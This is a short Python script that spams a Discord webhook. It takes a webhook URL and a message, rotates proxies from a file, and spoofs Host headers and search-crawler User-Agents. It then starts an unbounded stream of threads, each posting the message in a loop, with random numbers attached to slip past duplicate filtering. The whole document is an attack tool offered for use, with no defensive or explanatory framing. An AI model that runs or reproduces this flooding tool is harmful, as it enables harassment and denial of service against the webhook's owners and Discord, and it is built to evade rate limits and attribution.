import os, httpx, random, time
from random import randint
from threading import Thread

webhook = input("Webhook: ")
message = input("Message: ")

proxfile1 = 'http.txt'
prox1 = list(map(lambda x:x.strip(),open(proxfile1)))
Hosts = ['discord.gg','discord.com','discordapp.com']
Uas = ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)','Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)','Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)','DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)']

def webhookspam():
    proxy1 = random.choice(prox1)
    bypassint = randint(0, 1000)
    headers = {'Host': random.choice(Hosts),'User-Agent': random.choice(Uas)}
    with httpx.Client(http2=True,proxies='http://'+proxy1) as client:
        try:
            try:
                while True:
                    response = client.post(
                        webhook,
                        json = {"content" : str(bypassint)+' '+message+' '+str(bypassint)},
                        params = {'wait' : True}
                    )
                    if response.status_code == 204 or response.status_code == 200:
                        print("Message sent")
                        time.sleep(20)
                    elif response.status_code == 429:
                        print("Rate limited")
                        time.sleep(1000)
                    else:
                        pass
            except httpx.HTTPError as exc:
                pass
        except:
            pass
    
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    while True:
        t = Thread(target=webhookspam,daemon=True).start()

